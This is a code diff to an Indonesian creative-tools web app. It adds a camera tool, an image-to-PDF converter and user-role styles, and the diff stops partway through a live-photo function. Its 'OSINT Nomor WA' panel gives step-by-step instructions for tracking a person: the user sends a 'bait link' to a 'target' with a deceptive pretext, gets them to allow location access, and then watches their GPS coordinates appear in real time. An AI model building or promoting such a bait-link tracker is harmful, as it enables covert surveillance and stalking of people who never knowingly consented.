@@ -265,6 +265,52 @@
   .swatch.selected { outline: 3px solid var(--ink); outline-offset: 2px; }
 
   @media(max-width:560px){ .hero h1{font-size:22px;} .nav-link { font-size: 12px; padding: 8px 12px;} .music-panel { width: 260px; max-height: 50vh; } .bottom-nav-wrapper{ bottom: 10px; } }
+
+  /* ====== KAMERA PRO ====== */
+  .cam-stage { position: relative; width: 100%; max-width: 480px; margin: 0 auto; aspect-ratio: 3/4; background: #000; border: 3px solid var(--ink); border-radius: 16px; overflow: hidden; box-shadow: var(--shadow); }
+  .cam-stage video { width: 100%; height: 100%; object-fit: cover; display: block; }
+  .cam-stage canvas { display: none; }
+  .cam-overlay { position: absolute; inset: 0; pointer-events: none; }
+  .cam-grid { position: absolute; inset: 0; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; }
+  .cam-grid > div { border: 1px solid rgba(255,255,255,0.25); }
+  .cam-topbar { position: absolute; top: 10px; left: 10px; right: 10px; display: flex; justify-content: space-between; align-items: center; pointer-events: none; }
+  .cam-badge { background: rgba(0,0,0,0.55); color: #fff; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px; border: 1.5px solid rgba(255,255,255,0.4); }
+  .cam-controls { display: flex; justify-content: center; align-items: center; gap: 18px; margin-top: 18px; flex-wrap: wrap; }
+  .cam-btn { width: 56px; height: 56px; border-radius: 50%; border: 3px solid var(--ink); background: var(--card); cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: var(--shadow-sm); transition: transform .1s; color: var(--ink); }
+  .cam-btn:hover { transform: scale(1.06); }
+  .cam-btn:active { transform: scale(0.95); }
+  .cam-btn.primary { width: 72px; height: 72px; background: var(--yellow); }
+  .cam-btn.rec { background: var(--red); }
+  .cam-btn.active { background: var(--mint); }
+  .cam-btn svg { width: 24px; height: 24px; }
+  .cam-btn.primary svg { width: 30px; height: 30px; }
+  .cam-status { text-align: center; font-size: 12px; font-weight: 700; color: var(--muted); margin-top: 10px; min-height: 18px; }
+  .cam-result { margin-top: 16px; display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 10px; }
+  .cam-result .shot { position: relative; border: 2.5px solid var(--ink); border-radius: 10px; overflow: hidden; background: #000; }
+  .cam-result .shot img, .cam-result .shot video { width: 100%; display: block; }
+  .cam-result .shot .live-tag { position: absolute; top: 4px; left: 4px; background: var(--pink); color: #14151a; font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 999px; border: 1.5px solid var(--ink); }
+  .cam-result .shot .dl { position: absolute; bottom: 4px; right: 4px; background: var(--mint); border: 1.5px solid var(--ink); border-radius: 6px; width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; color: #14151a; font-weight: bold; }
+  .cam-timer { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 90px; font-weight: 900; color: var(--yellow); text-shadow: 0 0 20px #000; pointer-events: none; display: none; }
+
+  /* ====== OSINT WA ====== */
+  .osint-result { margin-top: 14px; }
+  .osint-card { background: var(--card); border: 2.5px solid var(--ink); border-radius: 12px; padding: 14px; box-shadow: var(--shadow-sm); margin-bottom: 12px; }
+  .osint-row { display: flex; justify-content: space-between; gap: 10px; padding: 6px 0; border-bottom: 1px dashed rgba(128,128,128,0.3); font-size: 13px; }
+  .osint-row:last-child { border-bottom: none; }
+  .osint-row .k { color: var(--muted); font-weight: 600; }
+  .osint-row .v { font-weight: 800; text-align: right; word-break: break-word; }
+  .osint-badge { display: inline-block; padding: 3px 10px; border-radius: 999px; border: 2px solid var(--ink); font-size: 11px; font-weight: 800; color: #14151a; }
+  .osint-map-btn { display: inline-flex; align-items: center; gap: 8px; margin-top: 10px; background: #7cc6fe; border: 2.5px solid var(--ink); padding: 8px 16px; border-radius: 999px; font-weight: 800; color: #14151a; text-decoration: none; box-shadow: var(--shadow-sm); font-size: 13px; }
+  .osint-map-btn:hover { transform: translate(-1px,-1px); box-shadow: 4px 4px 0 var(--ink); }
+
+  /* ====== ROLE DOT DI USER LIST ====== */
+  .role-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; border: 1.5px solid var(--ink); margin-right: 6px; vertical-align: middle; }
+  .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; border: 1.5px solid var(--ink); margin-right: 6px; vertical-align: middle; }
+  .role-developer { background: var(--violet); }
+  .role-owner { background: var(--yellow); }
+  .role-moderator { background: #ffb86c; }
+  .role-partner { background: #7cc6fe; }
+  .role-user { background: var(--mint); }
 </style>
 </head>
 <body>
@@ -530,7 +576,7 @@
     <div class="nav-link active" id="nav-home" onclick="showPage('home')">Dashboard</div>
     <div class="nav-link" id="nav-pengumuman" onclick="showPage('pengumuman')">Pengumuman</div>
     <div class="nav-link" id="nav-rating" onclick="showPage('rating')">Rating</div>
-    <div class="nav-link" id="nav-adduser" onclick="showPage('adduser')" style="display:none; color:var(--violet);">Kelola User</div>
+    <div class="nav-link" id="nav-adduser" onclick="showPage('adduser')" style="display:none;">Kelola User</div>
     <div class="nav-link" id="nav-about" onclick="showPage('about')">About</div>
   </div>
 </div>
@@ -570,6 +616,48 @@
   <div class="panel">
     <div class="panel-head"><h2><span class="emoji-badge" id="panelEmoji"></span><span id="panelTitle">Tool</span></h2><button class="closeBtn" onclick="closePanel()">✕</button></div>
     <div class="panel-body" id="panelBody"></div>
+  </div>
+</div>
+
+<!-- MODAL KAMERA PRO -->
+<div class="overlay" id="cameraOverlay" style="z-index:80;">
+  <div class="panel" style="max-width:560px;">
+    <div class="panel-head">
+      <h2><span class="emoji-badge" style="background:var(--pink);">📷</span>Kamera Pro</h2>
+      <button class="closeBtn" onclick="closeCamera()">✕</button>
+    </div>
+    <div class="panel-body">
+      <div class="cam-stage">
+        <video id="camVideo" autoplay playsinline muted></video>
+        <canvas id="camCanvas"></canvas>
+        <div class="cam-overlay">
+          <div class="cam-grid"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+          <div class="cam-topbar">
+            <span class="cam-badge" id="camFacingBadge">Belakang</span>
+            <span class="cam-badge" id="camModeBadge">Foto</span>
+          </div>
+          <div class="cam-timer" id="camTimer"></div>
+        </div>
+      </div>
+      <div class="cam-status" id="camStatus">Menyiapkan kamera...</div>
+      <div class="cam-controls">
+        <button class="cam-btn" id="camFlashBtn" onclick="toggleFlash()" title="Flash">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+        </button>
+        <button class="cam-btn primary" id="camShutter" onclick="takeShot()" title="Ambil">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/></svg>
+        </button>
+        <button class="cam-btn" id="camSwitchBtn" onclick="switchCamera()" title="Ganti Kamera">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 7h4l2-3h6l2 3h4v13H3z"/><path d="M8 13a4 4 0 1 0 8 0 4 4 0 0 0-8 0z"/></svg>
+        </button>
+      </div>
+      <div class="cam-controls" style="margin-top:6px;">
+        <button class="cam-btn active" id="camModePhoto" onclick="setCamMode('photo')" title="Mode Foto" style="width:52px;height:52px;font-size:10px;font-weight:800;">FOTO</button>
+        <button class="cam-btn" id="camModeVideo" onclick="setCamMode('video')" title="Rekam Video Stabil" style="width:52px;height:52px;font-size:10px;font-weight:800;">VID</button>
+        <button class="cam-btn" id="camModeLive" onclick="setCamMode('live')" title="Live Photo" style="width:52px;height:52px;font-size:10px;font-weight:800;">LIVE</button>
+      </div>
+      <div class="cam-result" id="camResult"></div>
+    </div>
   </div>
 </div>
 
@@ -667,6 +755,9 @@ const TOOLS = [
   {id:'pptx', icon:SVG.ppt, color:'sky', title:'Buat PPTX', desc:'Susun slide presentasi + gambar, download sebagai PowerPoint.'},
   {id:'ai', icon:SVG.ai, color:'pink', title:'AI Assistant', desc:'Suruh AI bikinin sesuatu, hasilnya bisa langsung dijadikan PDF/PPTX.'},
   {id:'enhancer', icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>', color:'mint', title:'Penjernih Foto', desc:'Bikin foto buram jadi tajam pake AI.'},
+  {id:'camera', icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 7h4l2-3h6l2 3h4v13H3z"/><circle cx="12" cy="13" r="4"/></svg>', color:'pink', title:'Kamera Pro', desc:'Foto/Video stabil, flash, live photo, kamera depan & belakang.'},
+  {id:'osint', icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>', color:'sky', title:'OSINT Nomor WA', desc:'Cek operator, koordinat, dan buka di Google Maps.'},
+  {id:'img2pdf', icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>', color:'sky', title:'Gambar ke PDF', desc:'Kumpulan gambar jadi 1 PDF, bisa atur posisi, ukuran & orientasi.'},
 ];
 const COLORS = {violet:'var(--violet)', mint:'var(--mint)', sky:'#7cc6fe', pink:'var(--pink)'};
 const gridEl = document.getElementById('grid');
@@ -719,6 +810,38 @@ const TEMPLATES = {
 
     <button class="btn" onclick="downloadEnhancer()" style="width:100%; margin-top:15px; background:var(--mint);">Download Foto Jernih</button>
   </div>`,
+  camera: `<p class="desc">Foto/Video stabil, flash, live photo. Klik tombol di bawah untuk buka kamera.</p>
+    <button class="btn" onclick="openCamera()" style="width:100%; background:var(--pink);">📷 Buka Kamera</button>
+    <p class="desc" style="margin-top:14px; font-size:12px;">Tip: kasih izin kamera & mikrofon. Untuk stabilisasi maksimal, pakai device yang support OIS/EIS.</p>`,
+  img2pdf: `<p class="desc">Upload gambar, atur posisi & orientasi per halaman, lalu download jadi PDF.</p>
+    <label>Upload Gambar (bisa banyak)</label>
+    <input type="file" id="pdfImages" accept="image/*" multiple onchange="handlePdfImages(event)" style="border:2.5px solid var(--ink);border-radius:10px;padding:10px;width:100%;background:var(--card);color:var(--ink);">
+    <div id="pdfImgPreview" style="display:flex; flex-direction:column; gap:20px; margin-top:10px;"></div>
+    <button class="btn" onclick="makePDF()" style="width:100%; margin-top:15px; background:var(--mint);">Buat PDF</button>`,
+  osint: `<p class="desc">Lacak lokasi target dengan mengirimkan link umpan. Ketika target membuka link dan mengizinkan akses lokasi, koordinatnya akan muncul di sini secara otomatis.</p>
+    
+    <div style="background:var(--violet); padding:15px; border-radius:10px; border:2px solid var(--ink); margin-bottom:15px; color:#14151a;">
+      <h4 style="margin:0 0 10px 0; font-size:16px; font-weight:800; text-transform:uppercase;">🔗 LINK TARGET</h4>
+      <input type="text" id="linkPelacak" value="https://kreatifstudio.vercel.app/" readonly style="width:100%; padding:10px; border-radius:5px; border:2px solid var(--ink); font-size:14px; background:var(--card); color:var(--ink); font-weight:bold; text-align:center;">
+      
+      <div style="margin-top:15px; font-size:12px; line-height:1.6;">
+        <b>📌 Penjelasan & Cara Pakai:</b><br>
+        1. Klik tombol <b>"Copy Link Umpan"</b> di bawah.<br>
+        2. Kirim link tersebut ke target (contoh: <i>"Bang, ini link web freelance saya, cek dulu"</i>).<br>
+        3. Tunggu target membuka link & klik tombol <b>"Masuk & Mulai"</b>.<br>
+        4. Pastikan target mengklik <b>"Izinkan Lokasi"</b> saat browser meminta akses.<br>
+        5. Koordinat GPS target akan muncul secara otomatis di bagian "Target Terdeteksi" di bawah ini.
+      </div>
+    </div>
+
+    <button class="btn" onclick="copyLinkPelacak()" style="width:100%; background:var(--yellow); color:#14151a; margin-bottom:15px;">📋 Copy Link Umpan</button>
+
+    <h4 style="margin-bottom:10px; font-size:14px;">📍 Target Terdeteksi (Realtime):</h4>
+    <div id="realtime-lokasi-container" style="margin-bottom:20px;">
+      <p style="font-size:12px; color:var(--muted); text-align:center;">Menunggu target masuk...</p>
+    </div>
+    
+    <div class="osint-result" id="osintResult"></div>`,
   ai: `<p class="desc">Pilih mode di bawah ini. Mode Belajar cocok buat nyari materi, Mode Biasa cocok buat ngobrol santai.</p>
   
   <div style="display:flex; gap:8px; margin-bottom:15px; flex-wrap:wrap;">
@@ -968,31 +1091,134 @@ function applyCrop() {
   closeCropModal(); 
 }
 
-// PDF IMAGES
+// PDF IMAGES (Gambar ke PDF)
 let pdfImages = [];
-function handlePdfImages(e){ Array.from(e.target.files).forEach(file => { const reader = new FileReader(); reader.onload = () => { pdfImages.push({ dataUrl: reader.result, sScale: 100, sRot: 0, sX: 0, sY: 0 }); renderPdfImgPreview(); }; reader.readAsDataURL(file); }); }
+function handlePdfImages(e){
+  Array.from(e.target.files).forEach(file => {
+    const reader = new FileReader();
+    reader.onload = () => {
+      pdfImages.push({
+        dataUrl: reader.result,
+        sScale: 100,
+        sRot: 0,
+        sX: 0,
+        sY: 0,
+        orient: 'auto'
+      });
+      renderPdfImgPreview();
+    };
+    reader.readAsDataURL(file);
+  });
+  e.target.value = '';
+}
+
 function renderPdfImgPreview(){
   const wrap = document.getElementById('pdfImgPreview'); if(!wrap) return; wrap.innerHTML = '';
   pdfImages.forEach((img, i) => {
-    const box = document.createElement('div'); box.innerHTML = `<div style="font-size:12px; font-weight:bold; margin-bottom:5px;">Gambar ${i+1}</div><div class="preview-container"><img src="${img.dataUrl}" class="preview-img" id="preview-pdf-${i}" style="transform: translate(-50%, -50%) translate(${img.sX}px, ${img.sY}px) scale(${img.sScale/100}) rotate(${img.sRot}deg);"></div><div class="btn-row" style="justify-content: space-between; margin-top:10px;"><button onclick="openCropModal('pdf', ${i})" style="border:2px solid var(--ink); background:var(--mint); font-weight:bold; border-radius:5px; cursor:pointer; font-size:12px; padding:6px 10px; color:#14151a;">Potong Gambar</button><button onclick="removePdfImage(${i})" style="border:2px solid var(--ink); background:var(--pink); font-weight:bold; border-radius:5px; cursor:pointer; font-size:12px; padding:6px 10px; color:#14151a;">Hapus</button></div><div class="slider-controls"><div class="slider-group"><span>Ukuran</span> <input type="range" min="10" max="300" value="${img.sScale}" oninput="updateSlider('pdf', ${i}, 'sScale', this.value)"> <span id="val-sScale-${i}">${img.sScale}%</span></div><div class="slider-group"><span>Rotasi</span> <input type="range" min="0" max="360" value="${img.sRot}" oninput="updateSlider('pdf', ${i}, 'sRot', this.value)"> <span id="val-sRot-${i}">${img.sRot}°</span></div><div class="slider-group"><span>Geser X</span> <input type="range" min="-200" max="200" value="${img.sX}" oninput="updateSlider('pdf', ${i}, 'sX', this.value)"> <span id="val-sX-${i}">${img.sX}px</span></div><div class="slider-group"><span>Geser Y</span> <input type="range" min="-200" max="200" value="${img.sY}" oninput="updateSlider('pdf', ${i}, 'sY', this.value)"> <span id="val-sY-${i}">${img.sY}px</span></div></div>`;
+    const previewClass = img.orient === 'l' ? 'preview-container ppt-preview' : 'preview-container';
+    const box = document.createElement('div');
+    box.innerHTML = `
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+        <div style="font-size:12px; font-weight:bold;">Gambar ${i+1}</div>
+        <div style="display:flex; gap:5px;">
+          <button onclick="setPdfOrient(${i}, 'auto')" style="border:2px solid var(--ink); background:${img.orient==='auto'?'var(--yellow)':'var(--card)'}; font-weight:bold; border-radius:5px; cursor:pointer; font-size:11px; padding:4px 8px; color:#14151a;">Auto</button>
+          <button onclick="setPdfOrient(${i}, 'p')" style="border:2px solid var(--ink); background:${img.orient==='p'?'var(--yellow)':'var(--card)'}; font-weight:bold; border-radius:5px; cursor:pointer; font-size:11px; padding:4px 8px; color:#14151a;">Potret</button>
+          <button onclick="setPdfOrient(${i}, 'l')" style="border:2px solid var(--ink); background:${img.orient==='l'?'var(--yellow)':'var(--card)'}; font-weight:bold; border-radius:5px; cursor:pointer; font-size:11px; padding:4px 8px; color:#14151a;">Lanskap</button>
+        </div>
+      </div>
+      <div class="${previewClass}">
+        <img src="${img.dataUrl}" class="preview-img" id="preview-pdf-${i}" style="transform: translate(-50%, -50%) translate(${img.sX}px, ${img.sY}px) scale(${img.sScale/100}) rotate(${img.sRot}deg);">
+      </div>
+      <div class="btn-row" style="justify-content: space-between; margin-top:10px;">
+        <button onclick="openCropModal('pdf', ${i})" style="border:2px solid var(--ink); background:var(--mint); font-weight:bold; border-radius:5px; cursor:pointer; font-size:12px; padding:6px 10px; color:#14151a;">✂️ Potong (Crop)</button>
+        <button onclick="removePdfImage(${i})" style="border:2px solid var(--ink); background:var(--pink); font-weight:bold; border-radius:5px; cursor:pointer; font-size:12px; padding:6px 10px; color:#14151a;">🗑️ Hapus</button>
+      </div>
+      <div class="slider-controls">
+        <div class="slider-group"><span>Ukuran</span> <input type="range" min="10" max="300" value="${img.sScale}" oninput="updateSlider('pdf', ${i}, 'sScale', this.value)"> <span id="val-sScale-${i}">${img.sScale}%</span></div>
+        <div class="slider-group"><span>Rotasi</span> <input type="range" min="0" max="360" value="${img.sRot}" oninput="updateSlider('pdf', ${i}, 'sRot', this.value)"> <span id="val-sRot-${i}">${img.sRot}°</span></div>
+        <div class="slider-group"><span>Geser X</span> <input type="range" min="-300" max="300" value="${img.sX}" oninput="updateSlider('pdf', ${i}, 'sX', this.value)"> <span id="val-sX-${i}">${img.sX}px</span></div>
+        <div class="slider-group"><span>Geser Y</span> <input type="range" min="-300" max="300" value="${img.sY}" oninput="updateSlider('pdf', ${i}, 'sY', this.value)"> <span id="val-sY-${i}">${img.sY}px</span></div>
+      </div>
+    `;
     wrap.appendChild(box);
   });
 }
+function setPdfOrient(i, orient){
+  if(!pdfImages[i]) return;
+  pdfImages[i].orient = orient;
+  renderPdfImgPreview();
+}
 function updateSlider(type, i, field, val){
-  if(type === 'pdf') { pdfImages[i][field] = +val; const el = document.getElementById(`preview-pdf-${i}`); if(el) el.style.transform = `translate(-50%, -50%) translate(${pdfImages[i].sX}px, ${pdfImages[i].sY}px) scale(${pdfImages[i].sScale/100}) rotate(${pdfImages[i].sRot}deg)`; const lbl = document.getElementById(`val-${field}-${i}`); if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px'); }
-  else { slides[i][field] = +val; const el = document.getElementById(`preview-ppt-${i}`); if(el) el.style.transform = `translate(-50%, -50%) translate(${slides[i].sX}px, ${slides[i].sY}px) scale(${slides[i].sScale/100}) rotate(${slides[i].sRot}deg)`; const lbl = document.getElementById(`val-${field}-${i}`); if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px'); }
+  if(type === 'pdf') {
+    pdfImages[i][field] = +val;
+    const el = document.getElementById(`preview-pdf-${i}`);
+    if(el) el.style.transform = `translate(-50%, -50%) translate(${pdfImages[i].sX}px, ${pdfImages[i].sY}px) scale(${pdfImages[i].sScale/100}) rotate(${pdfImages[i].sRot}deg)`;
+    const lbl = document.getElementById(`val-${field}-${i}`);
+    if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px');
+  } else {
+    slides[i][field] = +val;
+    const el = document.getElementById(`preview-ppt-${i}`);
+    if(el) el.style.transform = `translate(-50%, -50%) translate(${slides[i].sX}px, ${slides[i].sY}px) scale(${slides[i].sScale/100}) rotate(${slides[i].sRot}deg)`;
+    const lbl = document.getElementById(`val-${field}-${i}`);
+    if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px');
+  }
 }
 function removePdfImage(i){ pdfImages.splice(i,1); renderPdfImgPreview(); }
 
-// BUAT PDF
+// BUAT PDF (Khusus Gambar)
 function makePDF(){
-  const title = document.getElementById('pdfTitle').value.trim(); const body = document.getElementById('pdfBody').value; if(!body.trim() && pdfImages.length === 0){ alert('Isi teks atau gambar dulu'); return; }
-  const font = document.getElementById('pdfFont').value; const fontSize = +document.getElementById('pdfSize').value; const paper = document.getElementById('pdfPaper').value; const orient = document.getElementById('pdfOrient').value; const filename = document.getElementById('pdfFilename').value.trim() || title || 'dokumen';
-  const { jsPDF } = window.jspdf; const doc = new jsPDF({ orientation:orient, unit:'mm', format:paper });
-  const pageW = doc.internal.pageSize.getWidth(); const pageH = doc.internal.pageSize.getHeight(); const margin = 15, usableW = pageW - margin*2;
-  if (body.trim()) { doc.setFont(font); doc.setFontSize(fontSize); let y = margin + 5; if(title){ doc.setFontSize(fontSize + 5); doc.text(title, pageW/2, y, {align:'center'}); y += 12; doc.setFontSize(fontSize); } const lines = doc.splitTextToSize(body, usableW); lines.forEach(line => { if(y > pageH - margin){ doc.addPage(); y = margin + 5; } doc.text(line, margin, y); y += 7; }); }
-  if(pdfImages.length){ pdfImages.forEach((img, idx) => { if(body.trim() || idx > 0) doc.addPage(); const props = doc.getImageProperties(img.dataUrl); let maxW = pageW - margin*2, maxH = pageH - margin*2; let w = maxW, h = (props.height * maxW) / props.width; if(h > maxH){ h = maxH; w = (props.width * maxH) / props.height; } let finalW = w * (img.sScale/100), finalH = h * (img.sScale/100); let finalX = ((pageW - finalW)/2) + (img.sX * 0.5); let finalY = ((pageH - finalH)/2) + (img.sY * 0.5); doc.addImage(img.dataUrl, props.fileType || 'JPEG', finalX, finalY, finalW, finalH, null, 'FAST', img.sRot); }); }
-  doc.save(filename + '.pdf');
+  if(pdfImages.length === 0){ alert('Upload gambar dulu!'); return; }
+  const { jsPDF } = window.jspdf;
+  
+  // Inisialisasi pertama pake gambar pertama
+  let doc = new jsPDF({ orientation: 'p', unit: 'mm', format: 'a4' });
+
+  pdfImages.forEach((img, idx) => {
+    const props = doc.getImageProperties(img.dataUrl);
+    let imgOrient = img.orient;
+    
+    // Kalau auto, deteksi bentuk gambar
+    if (imgOrient === 'auto') {
+      imgOrient = props.width > props.height ? 'l' : 'p';
+    }
+
+    // Buat halaman baru (atau halaman pertama)
+    if (idx > 0) {
+      doc.addPage('a4', imgOrient);
+    } else {
+      // Halaman pertama ganti orientasi kalau perlu
+      if (imgOrient !== 'p') {
+        doc.deletePage(1);
+        doc.addPage('a4', imgOrient);
+      }
+    }
+
+    const pW = doc.internal.pageSize.getWidth();
+    const pH = doc.internal.pageSize.getHeight();
+    const margin = 10;
+    const usableW = pW - margin * 2;
+    const usableH = pH - margin * 2;
+
+    let w = usableW;
+    let h = (props.height * usableW) / props.width;
+    if (h > usableH) {
+      h = usableH;
+      w = (props.width * usableH) / props.height;
+    }
+
+    const finalW = w * (img.sScale / 100);
+    const finalH = h * (img.sScale / 100);
+    const finalX = ((pW - finalW) / 2) + (img.sX * 0.5);
+    const finalY = ((pH - finalH) / 2) + (img.sY * 0.5);
+
+    try {
+      doc.addImage(img.dataUrl, props.fileType || 'JPEG', finalX, finalY, finalW, finalH, null, 'FAST', img.sRot);
+    } catch(e) {
+      console.error('Gagal tambah gambar:', e);
+    }
+  });
+
+  doc.save('gambar-ke-pdf-' + Date.now() + '.pdf');
 }
 
 // TTT LOGIC
@@ -1383,6 +1609,340 @@ async function generateFromAI(targetFormat, msgIndex) {
     showGlassNotif('PPTX berhasil di-download!');
   }
 }
+// ============================================================
+// KAMERA PRO (stabil + flash + live photo + depan/belakang)
+// ============================================================
+let camStream = null, camFacing = 'environment', camFlashOn = false, camTorchSupported = false;
+let camMode = 'photo', camMediaRecorder = null, camChunks = [], camIsRecording = false;
+let camResultItems = [];
+
+window.openCamera = async function() {
+  document.getElementById('cameraOverlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
+  await startCameraStream();
+};
+window.closeCamera = function() {
+  stopCamRecording();
+  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
+  document.getElementById('cameraOverlay').classList.remove('open');
+  document.body.style.overflow = '';
+};
+
+async function startCameraStream() {
+  const statusEl = document.getElementById('camStatus');
+  statusEl.textContent = 'Menyiapkan kamera...';
+  try {
+    if (camStream) camStream.getTracks().forEach(t => t.stop());
+    const constraints = {
+      audio: true,
+      video: {
+        facingMode: camFacing,
+        width: { ideal: 1920 },
+        height: { ideal: 1080 },
+        advanced: [ { stabilization: 'on' }, { imageStabilization: 'on' } ]
+      }
+    };
+    camStream = await navigator.mediaDevices.getUserMedia(constraints);
+    const v = document.getElementById('camVideo');
+    v.srcObject = camStream;
+    await v.play();
+    const track = camStream.getVideoTracks()[0];
+    const caps = track.getCapabilities ? track.getCapabilities() : {};
+    camTorchSupported = !!caps.torch;
+    document.getElementById('camFlashBtn').style.opacity = camTorchSupported ? '1' : '0.45';
+    document.getElementById('camStatus').textContent = camTorchSupported ? 'Kamera siap. Flash tersedia.' : 'Kamera siap. (Flash tidak didukung device ini)';
+  } catch (err) {
+    document.getElementById('camStatus').textContent = 'Gagal akses kamera: ' + (err.message || err);
+  }
+}
+
+window.switchCamera = async function() {
+  camFacing = camFacing === 'environment' ? 'user' : 'environment';
+  document.getElementById('camFacingBadge').textContent = camFacing === 'environment' ? 'Belakang' : 'Depan';
+  if (camFlashOn) toggleFlash();
+  await startCameraStream();
+};
+
+window.toggleFlash = async function() {
+  if (!camStream) return;
+  if (!camTorchSupported) { showGlassNotif('Device ini tidak mendukung flash/torch.'); return; }
+  try {
+    const track = camStream.getVideoTracks()[0];
+    camFlashOn = !camFlashOn;
+    await track.applyConstraints({ advanced: [{ torch: camFlashOn }] });
+    document.getElementById('camFlashBtn').classList.toggle('active', camFlashOn);
+  } catch(e) { showGlassNotif('Gagal toggle flash: ' + e.message); }
+};
+
+window.setCamMode = function(mode) {
+  camMode = mode;
+  document.getElementById('camModeBadge').textContent = mode === 'photo' ? 'Foto' : mode === 'video' ? 'Rekam Video' : 'Live Photo';
+  document.querySelectorAll('#camModePhoto,#camModeVideo,#camModeLive').forEach(b => b.classList.remove('active'));
+  document.getElementById(mode === 'photo' ? 'camModePhoto' : mode === 'video' ? 'camModeVideo' : 'camModeLive').classList.add('active');
+  document.getElementById('camShutter').classList.toggle('rec', mode === 'video' && camIsRecording);
+};
+
+function visualFlash() {
+  const stage = document.querySelector('.cam-stage');
+  const f = document.createElement('div');
+  f.style.cssText = 'position:absolute;inset:0;background:#fff;opacity:0.9;z-index:5;pointer-events:none;';
+  stage.appendChild(f);
+  setTimeout(() => f.style.opacity = '0', 80);
+  setTimeout(() => f.remove(), 200);
+}
+
+async function captureFrame() {
+  const v = document.getElementById('camVideo');
+  const c = document.getElementById('camCanvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  const ctx = c.getContext('2d');
+  ctx.drawImage(v, 0, 0);
+  applyCamSharpening(ctx, c.width, c.height);
+  return c.toDataURL('image/jpeg', 0.92);
+}
+
+function applyCamSharpening(ctx, w, h) {
+  try {
+    const imgData = ctx.getImageData(0, 0, w, h);
+    const px = imgData.data;
+    const out = ctx.createImageData(w, h);
+    const o = out.data;
+    const intensity = 0.6;
+    const center = 1 + 4 * intensity, edge = -intensity;
+    for (let y = 0; y < h; y++) {
+      for (let x = 0; x < w; x++) {
+        const i = (y * w + x) * 4;
+        if (x === 0 || x === w-1 || y === 0 || y === h-1) {
+          o[i]=px[i];o[i+1]=px[i+1];o[i+2]=px[i+2];o[i+3]=px[i+3]; continue;
+        }
+        for (let ch = 0; ch < 3; ch++) {
+          const val = px[i+ch]*center + px[i-4+ch]*edge + px[i+4+ch]*edge + px[i-w*4+ch]*edge + px[i+w*4+ch]*edge;
+          o[i+ch] = Math.min(255, Math.max(0, val));
+        }
+        o[i+3] = px[i+3];
+      }
+    }
+    ctx.putImageData(out, 0, 0);
+  } catch(e) {}
+}
+
+window.takeShot = async function() {
+  if (!camStream) { showGlassNotif('Kamera belum siap.'); return; }
+  if (camMode === 'photo') {
+    visualFlash();
+    const dataUrl = await captureFrame();
+    camResultItems.unshift({ type: 'image', url: dataUrl });
+    renderCamResult();
+  } else if (camMode === 'video') {
+    if (camIsRecording) { stopCamRecording(); return; }
+    startCamVideoRecording();
+  } else if (camMode === 'live') {
+    await doLivePhoto();
+  }
+};
+
+function startCamVideoRecording() {
+  if (!window.MediaRecorder) { showGlassNotif('Browser tidak support MediaRecorder.'); return; }
+  camChunks = [];
+  let mime = 'video/webm;codecs=vp9';
+  if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
+  try {
+    camMediaRecorder = new MediaRecorder(camStream, { mimeType: mime, videoBitsPerSecond: 4000000 });
+  } catch(e) {
+    try { camMediaRecorder = new MediaRecorder(camStream); }
+    catch(err) { showGlassNotif('Gagal mulai rekam: ' + err.message); return; }
+  }
+  camMediaRecorder.ondataavailable = e => { if (e.data.size) camChunks.push(e.data); };
+  camMediaRecorder.onstop = () => {
+    const blob = new Blob(camChunks, { type: 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    camResultItems.unshift({ type: 'video', url });
+    renderCamResult();
+  };
+  camMediaRecorder.start();
+  camIsRecording = true;
+  document.getElementById('camShutter').classList.add('rec');
+  document.getElementById('camStatus').textContent = '🔴 Merekam... klik tombol lagi untuk stop.';
+}
+
+function stopCamRecording() {
+  if (camMediaRecorder && camIsRecording) {
+    camMediaRecorder.stop();
+    camIsRecording = false;
+    document.getElementById('camShutter').classList.remove('rec');
+    document.getElementById('camStatus').textContent = 'Rekaman selesai.';
+  }
+}
+
+async function doLivePhoto() {
+  if (!window.MediaRecorder) { showGlassNotif('Browser tidak support MediaRecorder.'); return; }
+  document.getElementById('camStatus').textContent = '🎬 Live Photo: merekam 3 detik...';
+  const chunks = [];
+  let mime = 'video/webm;codecs=vp9';
